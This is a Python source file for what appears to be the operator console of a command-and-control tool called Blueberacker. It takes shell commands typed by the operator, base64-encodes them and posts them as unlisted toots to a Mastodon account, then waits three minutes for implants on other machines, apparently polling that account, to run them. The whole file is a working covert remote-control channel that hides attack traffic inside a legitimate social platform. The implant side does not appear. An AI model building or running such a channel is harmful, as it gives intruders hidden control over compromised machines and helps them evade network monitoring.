import os
import toml
import base64
import requests
import time
import alive_progress

def prompt():
    prompt = """
▀█████████▄   ▄█       ███    █▄     ▄████████ ▀█████████▄     ▄████████    ▄████████    ▄████████    ▄█   ▄█▄    ▄████████    ▄████████ 
  ███    ███ ███       ███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███ ▄███▀   ███    ███   ███    ███ 
  ███    ███ ███       ███    ███   ███    █▀    ███    ███   ███    ███   ███    █▀    ███    ███   ███▐██▀     ███    █▀    ███    ███ 
 ▄███▄▄▄██▀  ███       ███    ███  ▄███▄▄▄      ▄███▄▄▄██▀   ▄███▄▄▄▄██▀  ▄███▄▄▄       ███    ███  ▄█████▀     ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀▀███▀▀▀██▄  ███       ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ▀███████████ ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
  ███    ██▄ ███       ███    ███   ███    █▄    ███    ██▄ ▀███████████   ███    █▄    ███    ███   ███▐██▄     ███    █▄  ▀███████████ 
  ███    ███ ███▌    ▄ ███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███ ▀███▄   ███    ███   ███    ███ 
▄█████████▀  █████▄▄██ ████████▀    ██████████ ▄█████████▀    ███    ███   ██████████   ███    █▀    ███   ▀█▀   ██████████   ███    ███ 
             ▀                                                ███    ███                             ▀                        ███    ███"""
             
    # Print blue Prompt
    print("\033[94m" + prompt + "\033[0m" + "\n\tby Pengrey\n\n")

# Get url and auth token from a toml file
def get_url_and_auth_token():
    # Define the url and auth token as global variables
    global url, auth_token

    # Get the url and auth token from the config file
    config = toml.load("config.toml")
    url = config["url"]
    auth_token = config["auth_token"]

def post_toot(command):
    # Encode command to base64
    toot = base64.b64encode(command.encode("utf-8"))

    # Set url
    url_api = url + "/api/v1/statuses"

    # Set Authorization header
    auth = {"Authorization": "Bearer " + auth_token}

    # Set data and set publish level to unlisted
    data = {"status": toot, "visibility": "unlisted"}

    # Post toot
    requests.post(url_api, headers=auth, data=data)

def wait():
    wait_time =  3 * 60 # 3 minutes
    
    # Wait for command to be executed
    with alive_progress.alive_bar(wait_time, bar="blocks", spinner="classic", title="Waiting for command to be executed") as bar:
        for i in range(wait_time):
            time.sleep(1)
            bar()

    # Remove the progress bar print
    print("\033[A" + 120 * " " + "\033[A")

def serve():
    previous_command = ""
    while True:
        # Get command with red prompt
        command = input("\033[91m" + "> " + "\033[0m")

        # Check if is a exit command
        if command == "exit":
            exit()
        elif command == "":
            continue
        elif command == "help":
            print("exit - Exit the server")
            continue
        elif command == "clear":
            os.system("clear")
            continue
        elif command == previous_command:
            command = command + ";"
        else:
            previous_command = command

        # Post toot
        post_toot(command)

        # Wait for command to be executed
        wait()

# main function
def main():
    # Get url and auth token
    try:
        get_url_and_auth_token()
    except:
        print("[!] Error: Could not get url and auth token from config file")
        exit()

    # Print prompt
    prompt()

    try:
        serve()
    except KeyboardInterrupt:
        # print red Bye!
        print("\033[91m" + "\n[!] Bye!" + "\033[0m")
        exit()

if __name__ == "__main__":
    main()